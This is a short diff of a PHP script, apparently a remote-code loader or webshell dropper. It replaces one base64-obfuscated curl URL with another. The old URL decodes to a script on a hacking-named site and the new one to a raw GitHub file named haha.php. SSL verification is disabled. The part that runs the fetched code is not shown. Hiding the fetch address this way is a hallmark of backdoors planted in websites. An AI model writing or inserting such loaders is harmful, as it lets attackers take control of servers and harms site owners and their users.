@@ -23,7 +23,7 @@
         die('CURL is not installed!');
     }
     $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, base64_decode("aHR0cHM6Ly9oYWNrem9uZS5zaXRlL3NjcmlwdC9pbmRyYTIudHh0"));
+    curl_setopt($ch, CURLOPT_URL, base64_decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0Nsb3VkTmluZS1EaWdpdGFscy9ieXAvcmVmcy9oZWFkcy9tYWluL2hhaGEucGhw"));
 	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
     curl_setopt($ch, CURLOPT_HEADER, false);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
